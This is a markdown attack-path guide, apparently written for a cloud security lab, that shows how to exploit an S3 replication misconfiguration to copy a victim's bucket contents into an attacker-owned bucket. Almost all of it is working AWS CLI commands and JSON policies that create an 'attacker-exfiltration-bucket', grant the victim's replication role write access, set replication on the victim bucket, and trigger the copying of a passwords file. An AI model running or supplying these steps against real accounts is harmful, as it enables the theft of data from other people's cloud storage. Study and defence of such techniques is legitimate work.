# S3 Replication Attack Path

This document outlines the steps to exploit the S3 replication misconfiguration.

## Attack Path

1.  **Create an S3 bucket in your attacker account & enable versioning.**

    ```bash
    aws s3api create-bucket --bucket attacker-exfiltration-bucket-123 --region us-east-1 

    aws s3api put-bucket-versioning --bucket attacker-exfiltration-bucket-123 --versioning-configuration Status=Enabled
    ```

2.  **Create a manifest file (`replication.json`) that will tell the source bucket which role to use and which bucket to replicate to.**

    ```json
    // replication.json

    {
      "Role": "[INSERT_REPLICATION_ROLE_ARN_FROM_OUTPUT]", 
      "Rules": [
        {
          "Status": "Enabled",
          "Priority": 1,
          "DeleteMarkerReplication": { "Status": "Disabled" },
          "Filter" : { "Prefix": "" },
          "Destination": {
            "Bucket": "arn:aws:s3:::attacker-exfiltration-bucket-123" 
          }
        }
      ]
    }
    ```

3.  **Allow the Role from the victim account to put replicated objects in your bucket.** Create a bucket policy for your attacker bucket.

    ```json
    // attacker-bucket-policy.json
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Sid": "AllowReplication",
          "Effect": "Allow",
          "Principal": {
            "AWS": "[INSERT_REPLICATION_ROLE_ARN_FROM_VICTIM_OUTPUT]"
          },
          "Action": [
            "s3:ReplicateObject",
            "s3:ReplicateDelete",
            "s3:ReplicateTags",
            "s3:ObjectOwnerOverrideToBucketOwner"
          ],
          "Resource": [
            "arn:aws:s3:::[YOUR_ATTACKER_BUCKET_NAME]/*"
          ]
        }
      ]
    }
    ```
    
    Apply the policy: 
    
    ```bash
    aws s3api put-bucket-policy --bucket [YOUR_ATTACKER_BUCKET_NAME] --policy file://attacker-bucket-policy.json
    ```

4.  **Create the replication configuration on the victim bucket.**

    ```bash
    aws s3api put-bucket-replication \
        --bucket [SOURCE_BUCKET_NAME] \
        --replication-configuration file://replication.json \
        --profile victim
    ```

5.  **Trigger a replication.**

    ```bash
    # Upload a file to the SOURCE bucket
    echo "New secret data" > new_passwords.txt
    aws s3 cp new_passwords.txt s3://[SOURCE_BUCKET_NAME]/ --profile victim
    ```

After a few moments, the `new_passwords.txt` file will be replicated to your `attacker-exfiltration-bucket-123` bucket.
